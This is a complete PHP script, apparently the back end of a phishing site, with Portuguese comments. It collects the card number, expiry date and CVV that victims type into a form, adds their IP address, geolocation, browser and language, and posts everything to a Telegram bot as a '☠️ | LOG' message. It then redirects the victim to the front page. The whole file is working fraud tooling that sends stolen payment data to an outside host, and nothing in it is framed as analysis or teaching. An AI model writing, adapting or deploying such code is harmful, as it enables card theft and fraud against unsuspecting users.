<?php
// Inicia buffer para evitar erros de “headers already sent”
ob_start();

/**
 * Obtém informações de geolocalização a partir do IP via ip-api.com,
 * retornando valores padrão em caso de erro.
 */
function getIpInfo(string $ip): array {
    $apiUrl  = "http://ip-api.com/json/{$ip}";
    $apiData = @file_get_contents($apiUrl); // Suprime warnings
    if ($apiData === false) {
        return ['query'=>$ip,'city'=>'N/A','regionName'=>'N/A','country'=>'N/A','isp'=>'N/A'];
    }
    $data = json_decode($apiData, true);
    if (!isset($data['status']) || $data['status'] !== 'success') {
        return ['query'=>$ip,'city'=>'N/A','regionName'=>'N/A','country'=>'N/A','isp'=>'N/A'];
    }
    return $data;
}

/**
 * Detecta o navegador a partir do user agent.
 */
function getBrowserName(string $ua): string {
    if (stripos($ua, 'Firefox') !== false)   return 'Firefox';
    if (stripos($ua, 'MSIE')    !== false ||
        stripos($ua, 'Trident') !== false)   return 'Internet Explorer';
    if (stripos($ua, 'Edge')    !== false)   return 'Microsoft Edge';
    if (stripos($ua, 'Chrome')  !== false)   return 'Google Chrome';
    if (stripos($ua, 'Safari')  !== false)   return 'Safari';
    if (stripos($ua, 'Opera')   !== false ||
        stripos($ua, 'OPR')     !== false)   return 'Opera';
    return 'Desconhecido';
}

/**
 * Envia mensagem ao Telegram usando cURL.
 */
function sendToTelegram(string $botToken, string $chatId, string $message): bool {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text'    => $message
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    if ($response === false) {
        error_log("cURL Error: " . curl_error($ch));
        curl_close($ch);
        return false;
    }
    curl_close($ch);
    // opcional: validar json {"ok":true,...}
    return true;
}

// Verifica método
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Lê e sanitiza campos do formulário
    $numero   = trim($_POST['campoNome']  ?? '');
    $validade = trim($_POST['campoTel']   ?? '');
    $cvv      = trim($_POST['campoTel2']  ?? '');

    if ($numero === '' || $validade === '' || $cvv === '') {
        echo 'Por favor, preencha todos os campos.';
        ob_end_flush();
        exit;
    }

    // Obtém o IP real, mesmo atrás de proxy
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip  = trim($ips[0]);
    } else {
        $ip  = $_SERVER['REMOTE_ADDR'];
    }

    $userAgent = $_SERVER['HTTP_USER_AGENT']          ?? 'N/A';
    $lang      = $_SERVER['HTTP_ACCEPT_LANGUAGE']     ?? 'N/A';
    $info      = getIpInfo($ip);
    $browser   = getBrowserName($userAgent);
    $dateTime  = date('Y-m-d H:i:s');

    // Monta o texto da mensagem
    $message  = "☠️ | LOG\n";
    $message .= "💳 Número do Cartão: {$numero}\n";
    $message .= "📅 Validade: {$validade}\n";
    $message .= "🔑 CVV: {$cvv}\n\n";
    $message .= "🏠 IP: {$info['query']}\n";
    $message .= "🔎 Cidade: {$info['city']}\n";
    $message .= "📍 Região: {$info['regionName']}\n";
    $message .= "🌎 País: {$info['country']}\n";
    $message .= "📦 ISP: {$info['isp']}\n\n";
    $message .= "🔓 USER-AGENT: {$userAgent}\n";
    $message .= "🌐 Navegador: {$browser}\n";
    $message .= "👥 Linguagem: {$lang}\n";
    $message .= "📆 Data/Hora: {$dateTime}";

    // Lê credenciais do ambiente (definidas no Render)
    $botToken = getenv('BOT_TOKEN') ?: '';
    $chatId   = getenv('CHAT_ID')   ?: '';

    // Envia ao Telegram
    if (sendToTelegram($botToken, $chatId, $message)) {
        header('Location: index.html');
        exit;
    } else {
        echo 'Houve um erro ao enviar os dados. Tente novamente.';
    }

} else {
    // Se não for POST, redireciona
    header('Location: index.html');
    exit;
}

ob_end_flush();